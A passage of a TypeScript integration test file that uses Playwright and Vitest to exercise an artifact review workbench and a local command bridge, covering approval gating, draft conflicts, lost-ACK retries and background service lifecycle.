            file.path.slice(join(f.root, 'ui').length),
            file,
          ],
        ),
      );
      let origin = '',
        lostSave = false,
        lostContinuation = false,
        writeCount = 0;
      const server = createServer((req, res) => {
        void (async () => {
          const url = new URL(req.url ?? '/', origin || 'http://localhost'),
            path = url.pathname;
          if (path === '/') {
            res.setHeader(
              'set-cookie',
              'p07=synthetic; HttpOnly; SameSite=Strict; Path=/',
            );
            res.setHeader('content-type', 'text/html');
            res.end(
              `<!doctype html><html><head><meta name="viewport" content="width=device-width"><style>*{box-sizing:border-box}body{margin:0;font:14px system-ui}body,button,select{color:#20242b;background:#fff}</style><link rel="stylesheet" href="/workbench-page.css"></head><body><div id="root"></div><script id="p07-input" type="application/json">${JSON.stringify({ sessionId: f.sessionId, workspaceId: f.context.workspaceId, tenantHeaders: {} })}</script><script type="module" src="/workbench-page.js"></script></body></html>`,
            );
            return;
          }
          const asset = assets.get(path);
          if (asset) {
            res.setHeader(
              'content-type',
              path.endsWith('.css') ? 'text/css' : 'application/javascript',
            );
            res.end(asset.contents);
            return;
          }
          res.setHeader('content-type', 'application/json');
          res.setHeader('cache-control', 'private, no-store');
          if (!req.headers.cookie?.includes('p07=synthetic')) {
            res.writeHead(401).end('{}');
            return;
          }
          const base = `/api/v1/sessions/${f.sessionId}/artifacts`;
          if (path.startsWith(base) && path.endsWith('/executions')) {
            // P07 exercises the feature-off P08 server contract.
            res.statusCode = 404;
            res.end();
            return;
          }
          if (path === `/api/v1/sessions/${f.sessionId}/interactions`) {
            res.end(
              JSON.stringify(
                await getInteractionStatus(f.context, f.sessionId),
              ),
            );
            return;
          }
          if (
            path === `/api/v1/sessions/${f.sessionId}/messages` &&
            req.method === 'POST'
          ) {
            if (req.headers.origin !== origin) {
              res.writeHead(403).end('{}');
              return;
            }
            const chunks: Buffer[] = [];
            for await (const chunk of req) chunks.push(Buffer.from(chunk));
            const result = await sendChatMessage(
              f.context,
              f.context.workspaceId!,
              f.sessionId,
              JSON.parse(Buffer.concat(chunks).toString()),
            );
            if (lostContinuation) {
              lostContinuation = false;
              res.writeHead(503).end(
                JSON.stringify({
                  error: { message: '合成 ACK 丢失，可重试' },
                }),
              );
              return;
            }
            res.end(JSON.stringify(result));
            return;
          }
          if (!path.startsWith(base)) {
            res.writeHead(404).end('{}');
            return;
          }
          const context = {
            ...f.context,
            workspaceId:
              url.searchParams.get('workspaceId') ?? f.context.workspaceId,
          };
          const result = async () => {
            if (path === base)
              return listWorkbenchArtifacts(
                context,
                f.sessionId,
                url.searchParams.has('before')
                  ? JSON.parse(url.searchParams.get('before')!)
                  : undefined,
                database,
              );
            const [id, action] = path.slice(base.length + 1).split('/');
            const artifact = await getWorkbenchArtifact(
              context,
              f.sessionId,
              id!,
              database,
            );
            if (action === 'content') {
              const bytes = await readArtifactBytes(f.storage, artifact.object);
              return artifact.kind === 'changeset'
                ? { kind: 'changeset', changeset: parseChangesetBytes(bytes) }
                : {
                    kind: 'text',
                    text: bytes.toString('utf8'),
                    mediaType: artifact.object.mediaType,
                  };
            }
            if (action === 'feedback') {
              if (req.headers.origin !== origin) {
                res.statusCode = 403;
                return {};
              }
              let size = 0;
              const chunks: Buffer[] = [];
              for await (const chunk of req) {
                size += chunk.length;
                if (size > 300000) throw Error('too_large');
                chunks.push(Buffer.from(chunk));
              }
              const body = JSON.parse(Buffer.concat(chunks).toString());
              if (body.artifactId !== id) throw Error('mismatch');
              writeCount++;
              const feedback = await saveArtifactFeedback(
                context,
                f.sessionId,
                body,
                req.method === 'POST',
                f.storage,
                database,
              );
              if (lostSave) {
                lostSave = false;
                res.statusCode = 503;
                return {};
              }
              return { feedback };
            }
            return {
              artifact,
              feedback: await listArtifactFeedback(
                context,
                f.sessionId,
                id!,
                database,
              ),
            };
          };
          try {
            res.end(JSON.stringify(await result()));
          } catch (error) {
            res.statusCode =
              error instanceof ArtifactReviewError
                ? /changed|conflict|submitted/.test(error.code)
                  ? 409
                  : /identity/.test(error.code)
                    ? 403
                    : 400
                : 500;
            res.end(
              JSON.stringify({
                code:
                  error instanceof ArtifactReviewError
                    ? error.code
                    : 'fixture_error',
              }),
            );
          }
        })().catch(() => {
          res.statusCode = 500;
          res.end('{}');
        });
      });
      server.listen(0, '127.0.0.1');
      await once(server, 'listening');
      origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
      const browser = await chromium.launch({
        headless: true,
        executablePath:
          '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      });
      try {
        const page = await browser.newPage({
            viewport: { width: 1450, height: 1050 },
          }),
          external: string[] = [],
          errors: string[] = [];
        page.on('pageerror', (e) => errors.push(e.message));
        page.on('request', (r) => {
          if (!r.url().startsWith(origin)) external.push(r.url());
        });
        await page.goto(origin);
        await page
          .getByRole('button', { name: '工件与审查', exact: true })
          .click();
        await page
          .getByLabel('工件版本', { exact: true })
          .selectOption(change.id);
        await page.waitForSelector('[data-cline-diff] diffs-container');
        await page.waitForFunction(() => {
          const root = document.querySelector(
            '[data-cline-diff] diffs-container',
          )?.shadowRoot;
          return (
            !!root?.querySelector('style[data-theme-css]') &&
            root.textContent?.includes('42')
          );
        });
        expect(
          await page
            .getByText('比较范围：本次 Changeset 提案', { exact: false })
            .isVisible(),
        ).toBe(true);
        await page
          .locator(
            '[data-cline-diff] diffs-container [data-additions] [data-column-number="1"]',
          )
          .click();
        expect(
          await page.getByLabel('起始行', { exact: true }).inputValue(),
        ).toBe('1');
        expect(
          await page.getByLabel('评论侧', { exact: true }).inputValue(),
        ).toBe('after');
        await page
          .getByText('位置：answer.ts · 修改后 L1', { exact: false })
          .waitFor();
        await page.screenshot({ path: join(evidenceDir, 'desktop-diff.png') });
        await page
          .getByLabel('评论内容', { exact: true })
          .fill('请加上这行的测试。');
        await page.getByRole('button', { name: '加入本批意见' }).click();
        lostSave = true;
        await page
          .getByRole('button', { name: '保存草稿', exact: true })
          .click();
        await page.getByRole('alert').waitFor();
        await page
          .getByRole('button', { name: '保存草稿', exact: true })
          .click();
        await page.getByText('草稿已保存，重新打开可继续编辑。').waitFor();
        const saved = await listArtifactFeedback(
          f.context,
          f.sessionId,
          change.id,
          database,
        );
        expect(saved).toHaveLength(1);
        expect(saved[0]!.revision).toBe(1);
        expect(saved[0]!.comments[0]!.anchor).toMatchObject({
          path: 'answer.ts',
          side: 'after',
          startLine: 1,
          endLine: 1,
        });
        await page.reload();
        await page
          .getByRole('button', { name: '工件与审查', exact: true })
          .click();
        await page
          .getByLabel('工件版本', { exact: true })
          .selectOption(change.id);
        await page.getByRole('button', { name: '移除此条' }).waitFor();
        await page
          .getByRole('button', { name: '提交本批意见', exact: true })
          .click();
        await page
          .getByText('意见已提交，等待后续处理。它不是文件执行授权。')
          .waitFor();
        expect(
          (
            await listArtifactFeedback(
              f.context,
              f.sessionId,
              change.id,
              database,
            )
          )[0]!.state,
        ).toBe('submitted');
        await page.getByText('已提交 · 待处理', { exact: false }).click();
        lostContinuation = true;
        await page
          .getByRole('button', {
            name: '请 Rice 根据本批意见修订',
            exact: true,
          })
          .click();
        await page
          .getByText('合成 ACK 丢失，可重试', { exact: true })
          .waitFor();
        await page
          .getByRole('button', {
            name: '请 Rice 根据本批意见修订',
            exact: true,
          })
          .click();
        await page
          .getByRole('button', { name: '修订请求已发送', exact: true })
          .waitFor();
        expect(
          await database`select response_id from allrice_review_continuations where organization_id=${f.context.organizationId}`,
        ).toHaveLength(1);
        expect(
          await database`select id from allrice_runtime_operations where organization_id=${f.context.organizationId}`,
        ).toHaveLength(0);
        await page
          .getByLabel('工件版本', { exact: true })
          .selectOption(textArtifact.id);
        await page.getByLabel('评论内容', { exact: true }).fill('全局意见');
        await page.getByRole('button', { name: '加入本批意见' }).click();
        await page
          .getByRole('button', { name: '保存草稿', exact: true })
          .click();
        await page.getByText('草稿已保存，重新打开可继续编辑。').waitFor();
        // A second window must not replace a newer revision with its old draft.
        const peer = await browser.newPage({
          viewport: { width: 1450, height: 1050 },
        });
        await peer.goto(origin);
        await peer
          .getByRole('button', { name: '工件与审查', exact: true })
          .click();
        await peer
          .getByLabel('工件版本', { exact: true })
          .selectOption(textArtifact.id);
        await peer.getByRole('button', { name: '移除此条' }).waitFor();
        await peer
          .getByLabel('评论内容', { exact: true })
          .fill('第二个窗口的旧草稿');
        await peer.getByRole('button', { name: '加入本批意见' }).click();
        await page
          .getByLabel('评论内容', { exact: true })
          .fill('第一个窗口的补充');
        await page.getByRole('button', { name: '加入本批意见' }).click();
        await page
          .getByRole('button', { name: '保存草稿', exact: true })
          .click();
        await expect
          .poll(
            async () =>
              (
                await listArtifactFeedback(
                  f.context,
                  f.sessionId,
                  textArtifact.id,
                  database,
                )
              )[0]?.revision,
          )
          .toBe(2);
        await peer
          .getByRole('button', { name: '保存草稿', exact: true })
          .click();
        await peer
          .getByRole('alert')
          .filter({ hasText: '版本或草稿已变化' })
          .waitFor();
        const currentDraft = await listArtifactFeedback(
          f.context,
          f.sessionId,
          textArtifact.id,
          database,
        );
        expect(currentDraft).toHaveLength(1);
        expect(currentDraft[0]!.comments.map((c) => c.text)).toEqual([
          '全局意见',
          '第一个窗口的补充',
        ]);
        await peer.close();
        const revisedDoc = await f.publish(
          'doc-revision',
          'first line\nrevised line',
          textArtifact.object.id,
        );
        await page
          .getByRole('button', { name: '刷新版本反馈', exact: true })
          .click();
        await page.getByText('旧版本 · 仅查看').waitFor();
        expect(
          await page
            .getByRole('button', { name: '提交本批意见', exact: true })
            .isDisabled(),
        ).toBe(true);
        await page.getByRole('button', { name: '查看最新版本' }).click();
        await page.getByText('revised line', { exact: false }).waitFor();
        expect(
          (
            await getWorkbenchArtifact(
              f.context,
              f.sessionId,
              revisedDoc.id,
              database,
            )
          ).stale,
        ).toBe(false);
        await page
          .getByRole('button', { name: '刷新列表', exact: true })
          .click();
        await page
          .getByLabel('工件版本', { exact: true })
          .selectOption(htmlArtifact.id);
        await page.getByText(html, { exact: false }).first().waitFor();
        await page
          .getByLabel('工件版本', { exact: true })
          .selectOption(svgArtifact.id);
        await page.getByText(svg, { exact: false }).first().waitFor();
        expect(
          await page.evaluate(() => Reflect.get(globalThis, 'P07_ATTACK')),
        ).toBeUndefined();
        expect(external).toEqual([]);
        await page
          .getByLabel('工件版本', { exact: true })
          .selectOption(largeArtifact.id);
        await page
          .getByText('文件过长，已停用富 Diff。', { exact: false })
          .waitFor();
        expect(await page.locator('[data-cline-diff]').count()).toBe(0);
        await page
          .getByText('查看完整前后文本（分页）', { exact: true })
          .click();
        await page
          .getByRole('button', { name: '下一页正文', exact: true })
          .click();
        await page
          .getByRole('button', { name: '评论第 101 行', exact: true })
          .click();
        expect(
          await page.getByLabel('起始行', { exact: true }).inputValue(),
        ).toBe('101');
        expect(await page.locator('pre button').count()).toBe(100);
        await page.setViewportSize({ width: 390, height: 844 });
        const dialog = page.getByRole('dialog', { name: '工件与审查工作台' });
        await dialog.waitFor();
        expect(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= innerWidth,
          ),
        ).toBe(true);
        await page.screenshot({
          path: join(evidenceDir, 'mobile-preview.png'),
        });
        await dialog.focus();
        await page.keyboard.press('Shift+Tab');
        expect(await dialog.locator(':focus').count()).toBe(1);
        await page.keyboard.press('Escape');
        await page.getByRole('dialog').waitFor({ state: 'hidden' });
        expect(
          await page
            .getByRole('button', { name: '工件与审查', exact: true })
            .evaluate((e) => e === document.activeElement),
        ).toBe(true);
        expect(errors).toEqual([]);
        expect(writeCount).toBe(6);
        console.info(
          'P07 browser evidence:',
          evidenceDir,
          'bundled bytes:',
          [...assets.values()].reduce((n, a) => n + a.contents.length, 0),
        );
      } finally {
        await browser.close();
        server.closeAllConnections();
        await new Promise<void>((resolve) => server.close(() => resolve()));
      }
    },
    120_000,
  );
  it('P05 requires exact approval even for tenant Allow; old clients cannot claim commands', async () => {
    const f = await commandFixture();
    const created = await f.create();
    expect(created.snapshot.status).toBe('waiting_user');
    expect(await f.claim()).toBeNull();
    await f.approve();
    expect(await f.claim(false)).toBeNull();
    const claim = await f.claim();
    expect(claim?.bridgePayload?.capability).toBe('local.process.execute');
    const retry = await f.create();
    expect(retry.snapshot.binding).toEqual(created.snapshot.binding);
    expect(await f.claim()).toBeNull();
  });
  it('P09-a requires a current diagnostic feature report, exact approval and compatible claim; revocation closes admission', async () => {
    const f = await commandFixture();
    const args = {
      ...f.args,
      args: [],
      diagnostics: { kind: 'node_project', expectedNodeMajor: 22 },
    };
    await expect(f.create('diagnose', args)).rejects.toThrow(
      'local_runner_upgrade_required',
    );
    await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["project_diagnostics"]'::jsonb) where device_id=${f.device.id}`;
    const op = await f.create('diagnose', args);
    expect(op.snapshot.status).toBe('waiting_user');
    const claim = () =>
      f.ledger().claimNextBridgeOperation({
        scope: f.task.scope,
        deviceId: f.device.id,
        leaseMs: 30000,
        supportsLocalCommand: true,
        supportsProjectDiagnostics: true,
      });
    expect(await claim()).toBeNull();
    await f.approve();
    expect(await f.claim()).toBeNull(); // P05 clients must not claim the extended payload.
    await expect(
      f.create('diagnose', {
        ...args,
        diagnostics: { kind: 'node_project', expectedNodeMajor: 23 },
      }),
    ).rejects.toThrow('idempotency_conflict');
    await database`update allrice_bridge_runtime_profiles set profile=profile-'features' where device_id=${f.device.id}`;
    expect(await claim()).toBeNull();
    await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["project_diagnostics"]'::jsonb) where device_id=${f.device.id}`;
    expect((await claim())?.bridgePayload).toMatchObject({
      arguments: {
        diagnostics: { kind: 'node_project', expectedNodeMajor: 22 },
      },
    });
  });
  async function serviceFixture(requestTimeoutMs = 10000) {
    const f = await commandFixture([
      'local.process.execute',
      'local.process.status',
      'local.process.stop',
    ]);
    vi.stubEnv('ALLRICE_LOCAL_SERVICE_ENABLED', '1');
    const args = {
      ...f.args,
      background: {
        durationMs: 60000,
        readiness: { kind: 'tcp', port: 3100, path: '/', timeoutMs: 5000 },
        stdin: {
          mode: 'requests-v1',
          maxRequests: 4,
          maxBytes: 100,
          requestTimeoutMs,
        },
      },
    };
    await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["background_services"]'::jsonb) where device_id=${f.device.id}`;
    const op = await f.create('service', args);
    await f.approve();
    const claim = () =>
      f.ledger().claimNextBridgeOperation({
        scope: f.task.scope,
        deviceId: f.device.id,
        leaseMs: 30000,
        supportsLocalCommand: true,
        supportsBackgroundServices: true,
      });
    expect(await f.claim()).toBeNull();
    const lease = (await claim())!;
    await f.ledger().startOperation({
      scope: f.task.scope,
      operationId: lease.snapshot.binding.attempt.operationId,
      leaseToken: lease.leaseToken,
      attempt: lease.snapshot.binding.attempt,
      receiptId: randomUUID(),
    });
    const base = {
      scope: f.task.scope,
      operationId: lease.snapshot.binding.attempt.operationId,
      leaseToken: lease.leaseToken,
      attempt: lease.snapshot.binding.attempt,
    };
    const exchange = (
      events: Parameters<
        ReturnType<typeof f.ledger>['exchangeLocalService']
      >[0]['events'] = [],
    ) => f.ledger().exchangeLocalService({ ...base, events });
    const initialized = await exchange();
    const event = {
      processId: base.operationId,
      attemptId: base.attempt.attemptId,
    };
    const starting = {
      ...event,
      sequence: 0,
      type: 'starting' as const,
      containerId: 'a'.repeat(64),
      hardDeadlineAt: initialized.hardDeadlineAt,
    };
    await exchange([starting]);
    return { ...f, op, args, base, event, starting, exchange, initialized };
  }
  it('P09-c preserves exact finite service identity, deduplicates readiness and returns nonterminal readiness to Worker', async () => {
    const f = await serviceFixture();
    const ready = {
      ...f.event,
      sequence: 1,
      type: 'ready' as const,
      port: 3100,
      visibility: 'container_only' as const,
    };
    const first = await f.exchange([ready]);
    expect(first.hardDeadlineAt).toBe(f.initialized.hardDeadlineAt);
    expect(first.snapshot.status).toBe('running');
    expect(first.snapshot.processId).toBe(f.base.operationId);
    expect((await f.exchange([ready])).acceptedSequence).toBe(1);
    await expect(f.exchange([{ ...ready, port: 3101 }])).rejects.toThrow(
      'receipt_conflict',
    );
    await expect(
      f.exchange([{ ...ready, sequence: 2, attemptId: randomUUID() }]),
    ).rejects.toThrow('scope_mismatch');
    const result = await waitLocalCommandOperation(f.op, undefined, database);
    expect(result.status).toBe('service_ready');
    expect(
      await localServiceWorkerAction(
        f.execution,
        f.base.operationId,
        'status',
        database,
      ),
    ).toMatchObject({ state: 'ready', visibility: 'container_only' });
    const stop = await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'stop',
      undefined,
      database,
    );
    expect(stop?.state).toBe('stopping');
    expect((await f.exchange()).stopRequested).toBe(true);
    expect(
      (await f.ledger().readOperation(f.task.scope, f.base.operationId)).status,
    ).toBe('cancel_requested');
  });
  it('P09-c retains late readiness before an input delivery fact without resurrecting a stopped service', async () => {
    const f = await serviceFixture();
    const request = {
      requestId: randomUUID(),
      sequence: 0,
      prompt: 'Short input',
      expiresAt: new Date(Date.now() + 8000).toISOString(),
      maxBytes: 100,
    };
    await f.exchange([
      { ...f.event, type: 'input_request', sequence: 1, request },
    ]);
    const input = {
      inputId: randomUUID(),
      requestId: request.requestId,
      sequence: 0,
      expiresAt: request.expiresAt,
      kind: 'text' as const,
      text: 'test',
      digest: digest({ kind: 'text', text: 'test' }),
    };
    await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'input',
      input,
      database,
    );
    await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'stop',
      undefined,
      database,
    );
    const priorLease = (await f.exchange()).leaseExpiresAt;
    const response = await f.ledger().exchangeLocalService({
      ...f.base,
      deliveryOnly: true,
      events: [
        {
          ...f.event,
          type: 'ready',
          sequence: 2,
          port: 3100,
          visibility: 'container_only',
        },
        {
          ...f.event,
          type: 'input_delivered',
          sequence: 3,
          inputId: input.inputId,
          requestId: input.requestId,
          inputSequence: 0,
          digest: input.digest,
          kind: 'text',
        },
      ],
    });
    expect(response.stopRequested).toBe(true);
    expect(response.inputs).toEqual([]);
    expect(response.acceptedSequence).toBe(3);
    expect(response.leaseExpiresAt).toBe(priorLease);
    const view = await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'status',
      undefined,
      database,
    );
    expect(view?.state).toBe('stopping');
    expect(view?.ready).toBe(false);
    expect(view?.requests[0]?.delivered).toBe(true);
  });
  it('P09-c delivery-only records late pipe facts without renewing, returning input or inventing cancellation', async () => {
    const f = await serviceFixture();
    const request = {
      requestId: randomUUID(),
      sequence: 0,
      prompt: 'Short input',
      expiresAt: new Date(Date.now() + 8000).toISOString(),
      maxBytes: 100,
    };
    await f.exchange([
      { ...f.event, type: 'input_request', sequence: 1, request },
    ]);
    const input = {
      inputId: randomUUID(),
      requestId: request.requestId,
      sequence: 0,
      expiresAt: request.expiresAt,
      kind: 'text' as const,
      text: 'test',
      digest: digest({ kind: 'text', text: 'test' }),
    };
    await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'input',
      input,
      database,
    );
    const prior = await f.exchange();
    expect(prior.inputs).toEqual([input]);
    const flush = (events: Parameters<typeof f.exchange>[0] = []) =>
      f
        .ledger()
        .exchangeLocalService({ ...f.base, events, deliveryOnly: true });
    const idle = await flush();
    expect(idle.inputs).toEqual([]);
    expect(idle.leaseExpiresAt).toBe(prior.leaseExpiresAt);
    expect(idle.snapshot.cancelRequestId).toBeNull();
    const events = [
      {
        ...f.event,
        type: 'ready' as const,
        sequence: 2,
        port: 3100,
        visibility: 'container_only' as const,
      },
      {
        ...f.event,
        type: 'input_delivered' as const,
        sequence: 3,
        inputId: input.inputId,
        requestId: input.requestId,
        inputSequence: 0,
        digest: input.digest,
        kind: input.kind,
      },
    ];
    const archived = await flush(events);
    expect(archived.leaseExpiresAt).toBe(prior.leaseExpiresAt);
    expect(archived.inputs).toEqual([]);
    expect(archived.snapshot.status).toBe('running');
    expect(archived.snapshot.cancelRequestId).toBeNull();
    expect(archived.acceptedSequence).toBe(3);
    expect((await flush(events)).acceptedSequence).toBe(3);
    const view = await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'status',
      undefined,
      database,
    );
    expect(view?.ready).toBe(false);
    expect(view?.requests[0]?.delivered).toBe(true);
  });
  it.skipIf(process.env.ALLRICE_RUN_BROWSER_INTEGRATION !== '1')(
    'P09-c real Chrome narrow service card keeps one input intent, recovers lost ACK and distinguishes stop intent from evidence',
    async () => {
      const f = await serviceFixture(60000);
      const request = {
        requestId: randomUUID(),
        sequence: 0,
        prompt: '输入测试文字',
        expiresAt: new Date(Date.now() + 50000).toISOString(),
        maxBytes: 100,
      };
      await f.exchange([
        {
          ...f.event,
          type: 'ready',
          sequence: 1,
          port: 3100,
          visibility: 'container_only',
        },
        { ...f.event, type: 'input_request', sequence: 2, request },
      ]);
      const require = createRequire(resolve('apps/worker/package.json'));
      const { chromium } = require('playwright-core') as typeof Playwright;
      const build = createRequire(require.resolve('tsx/package.json'))(
        'esbuild',
      ).build;
      const assets = await build({
        entryPoints: [resolve('apps/web/test/local-command-page.tsx')],
        bundle: true,
        write: false,
        outdir: tmpdir(),
        platform: 'browser',
        format: 'iife',
        jsx: 'automatic',
        define: { 'process.env.NODE_ENV': '"production"' },
      });
      const js = assets.outputFiles.find((file: { path: string }) =>
        file.path.endsWith('.js'),
      ).text;
      const css = assets.outputFiles.find((file: { path: string }) =>
        file.path.endsWith('.css'),
      ).text;
      let submissions = 0;
      const inputIds = new Set<string>();
      const server = createServer((req, res) => {
        void (async () => {
          const path = new URL(req.url ?? '/', 'http://localhost').pathname;
          if (path === '/') {
            res.setHeader('content-type', 'text/html');
            res.end(
              `<!doctype html><meta name="viewport" content="width=device-width"><style>body{font:14px system-ui;margin:12px}*{box-sizing:border-box}${css}</style><div id="root"></div><script id="p05-input" type="application/json">${JSON.stringify({ runId: f.run, workspaceId: f.context.workspaceId, tenantHeaders: { 'x-p09c-browser': 'synthetic' }, runActive: false })}</script><script src="/fixture.js"></script>`,
            );
            return;
          }
          if (path === '/fixture.js') {
            res.setHeader('content-type', 'application/javascript');
            res.end(js);
            return;
          }
          if (req.headers['x-p09c-browser'] !== 'synthetic') {
            res.statusCode = 401;
            res.end();
            return;
          }
          res.setHeader('content-type', 'application/json');
          if (path === '/api/v1/runtime/local-commands') {
            res.end(
              JSON.stringify({
                operations: await listLocalCommandOperations(
                  f.context,
                  f.run,
                  database,
                ),
              }),
            );
            return;
          }
          if (
            path === '/api/v1/runtime/local-services' &&
            req.method === 'POST'
          ) {
            const chunks: Buffer[] = [];
            for await (const chunk of req) chunks.push(Buffer.from(chunk));
            const body = JSON.parse(Buffer.concat(chunks).toString()) as {
              action: 'stop' | 'input';
              input: unknown;
            };
            const service = await localServiceUserAction(
              f.context,
              f.run,
              f.base.operationId,
              body.action,
              body.input,
              database,
            );
            if (body.action === 'input') {
              submissions++;
              inputIds.add((body.input as { inputId: string }).inputId);
              if (submissions === 1) {
                res.destroy();
                return;
              }
            }
            res.end(JSON.stringify({ service }));
            return;
          }
          res.statusCode = 404;
          res.end();
        })().catch(() => {
          res.statusCode = 500;
          res.end('fixture request failed');
        });
      });
      server.listen(0, '127.0.0.1');
      await once(server, 'listening');
      const address = server.address();
      if (!address || typeof address === 'string')
        throw Error('fixture listener');
      const origin = `http://127.0.0.1:${address.port}`;
      const browser = await chromium.launch({
        headless: true,
        executablePath:
          '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      });
      try {
        const page = await browser.newPage({
          viewport: { width: 390, height: 844 },
        });
        await page.goto(origin);
        const card = page.getByRole('region', { name: '有限后台服务' });
        await card.getByRole('textbox').waitFor();
        expect(await card.innerText()).toContain('仅隔离容器内可达');
        expect(await card.innerText()).toContain('不是 Rice 的聊天提问');
        await card.getByRole('textbox').fill('user-input-once');
        await card
          .getByRole('button', { name: '发送进程输入', exact: true })
          .evaluate((button) => {
            (button as HTMLButtonElement).click();
            (button as HTMLButtonElement).click();
          });
        await page.waitForFunction(() =>
          document.body.textContent?.includes('已提交，等待投递确认'),
        );
        expect(inputIds.size).toBe(1);
        expect(submissions).toBeLessThanOrEqual(2); // Chrome may retry the same POST after a dropped response.
        expect(await card.getByRole('textbox').count()).toBe(0);
        const pending = (await f.exchange()).inputs;
        expect(pending).toHaveLength(1);
        expect(pending[0]?.text).toBe('user-input-once');
        expect(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= window.innerWidth,
          ),
        ).toBe(true);
        await page.reload();
        await page.waitForFunction(() =>
          document.body.textContent?.includes('已提交，等待投递确认'),
        );
        await card
          .getByRole('button', { name: '停止此服务', exact: true })
          .click();
        await page.waitForFunction(() =>
          document.body.textContent?.includes('正在请求停止，尚未确认'),
        );
        expect(await card.innerText()).toContain('投递结果未确认');
        expect(
          await card
            .getByRole('button', { name: '停止此服务', exact: true })
            .isDisabled(),
        ).toBe(true);
        expect(
          (await f.ledger().readOperation(f.task.scope, f.base.operationId))
            .status,
        ).toBe('running');
        await f.exchange();
        expect(
          (await f.ledger().readOperation(f.task.scope, f.base.operationId))
            .status,
        ).toBe('cancel_requested');
        const evidenceDirectory = await mkdtemp(
          resolve('.local/p09c-browser-'),
        );
        await page.screenshot({
          path: join(evidenceDirectory, 'narrow-stopping.png'),
          fullPage: true,
        });
        console.log('P09-c browser evidence:', evidenceDirectory);
        expect(inputIds.size).toBe(1);
        expect(submissions).toBeLessThanOrEqual(2);
      } finally {
        await browser.close();
        await new Promise<void>((resolve) => server.close(() => resolve()));
      }
    },
    60000,
  );
  it.skipIf(!process.env.ALLRICE_LOCAL_DOCKER_TEST_SOCKET)(
    'P09-c actual HTTP Bridge VM service ready, user input and targeted stop keep durable process evidence',
    async () => {
      const socketPath = process.env.ALLRICE_LOCAL_DOCKER_TEST_SOCKET!;
      if (socketPath !== '/Users/a123/.colima/allrice-b2/docker.sock')
        throw Error('dedicated test VM required');
      const f = await commandFixture([
        'local.process.execute',
        'local.process.status',
        'local.process.stop',
      ]);
      vi.stubEnv('ALLRICE_LOCAL_SERVICE_ENABLED', '1');
      const directory = await mkdtemp(join(tmpdir(), 'allrice-p09c-http-'));
      artifactRoots.push(directory);
      const project = join(directory, 'project');
      await mkdir(project);
      const root = await realpath(project);
      const fingerprint = createHash('sha256').update(root).digest('hex');
      const source = [
        "import http from 'node:http';import fs from 'node:fs';import {spawn} from 'node:child_process';",
        "spawn('/usr/local/bin/node',['-e','setInterval(()=>{},1000)'],{detached:true,stdio:'ignore'}).unref();",
        "http.createServer((q,s)=>s.end('ready')).listen(3100,'127.0.0.1',()=>fs.writeSync(3,JSON.stringify({type:'input.request',prompt:'测试进程输入'})+'\\n'));",
        "let n=0;process.stdin.on('data',()=>console.log('accepted-count:'+ ++n));",
      ].join('\n');
      await writeFile(join(project, 'service.mjs'), source);
      await database`update allrice_bridge_folder_grants set root_fingerprint=${fingerprint} where id=${f.grant}`;
      await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["background_services"]'::jsonb) where device_id=${f.device.id}`;
      const op = await f.create('p09c-http', {
        ...f.args,
        args: ['service.mjs'],
        files: [
          {
            path: 'service.mjs',
            sha256: `sha256:${createHash('sha256').update(source).digest('hex')}`,
          },
        ],
        limits: {
          ...f.args.limits,
          timeoutMs: 10000,
          memoryMiB: 128,
          cpuMillis: 500,
          pids: 32,
        },
        background: {
          durationMs: 45000,
          readiness: { kind: 'tcp', port: 3100, path: '/', timeoutMs: 15000 },
          stdin: {
            mode: 'requests-v1',
            maxRequests: 4,
            maxBytes: 100,
            requestTimeoutMs: 20000,
          },
        },
      });
      const processId = op.snapshot.binding.attempt.operationId;
      const handler = createRuntimeBridgeHttpHandler({
        enabled: () => true,
        authenticate: async (token) => {
          if (token !== 'p09c-synthetic') throw Error('unauthorized');
          return {
            device: f.device,
            grants: [
              {
                id: f.grant,
                deviceId: f.device.id,
                label: 'P09-c synthetic',
                rootFingerprint: fingerprint,
                createdAt: new Date().toISOString(),
                revokedAt: null,
              },
            ],
          };
        },
        ledgerForDevice: async () => f.ledger(),
      });
      const server = createServer((req, res) => {
        void (async () => {
          const chunks: Buffer[] = [];
          for await (const part of req) chunks.push(Buffer.from(part));
          const path = new URL(req.url!, 'http://localhost').pathname;
          const response = await handler(
            new Request(`http://localhost${path}`, {
              method: 'POST',
              headers: {
                authorization: String(req.headers.authorization ?? ''),
                'content-type': 'application/json',
              },
              body: Buffer.concat(chunks),
            }),
            path.split('/').at(-1) as
              | 'next'
              | 'start'
              | 'receipts'
              | 'heartbeat'
              | 'output'
              | 'service',
            path.split('/').at(-2),
          );
          res.statusCode = response.status;
          res.end(await response.text());
        })().catch(() => {
          res.statusCode = 500;
          res.end();
        });
      });
      server.listen(0, '127.0.0.1');
      await once(server, 'listening');
      const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
      const journal = await BridgeJournal.open({
        directory: join(directory, 'journal'),
        server: origin,
        deviceId: f.device.id,
      });
      const runner = new LocalCommandRunner({
        socketPath,
        imageDigest: localCommandToolchainImageV1,
      });
      const bridge = new RuntimeBridgeOperationClient({
        config: {
          server: origin,
          deviceId: f.device.id,
          deviceName: 'P09-c fixture',
          grants: [
            {
              id: f.grant,
              label: 'Fixture',
              rootPath: root,
              rootFingerprint: fingerprint,
            },
          ],
        },
        token: 'p09c-synthetic',
        journal,
        runner,
      });
      const { stopLocalProcesses } =
        await import('../../../apps/rice-bridge/src/local-process-manager.js');
      const until = async (check: () => Promise<boolean>) => {
        const until = Date.now() + 25000;
        while (Date.now() < until) {
          if (await check()) return;
          await new Promise((r) => setTimeout(r, 100));
        }
        throw Error('P09-c evidence timeout');
      };
      try {
        expect(await bridge.pollOnce()).toBe(false);
        await f.approve();
        expect(await bridge.pollOnce()).toBe(true);
        await until(async () => {
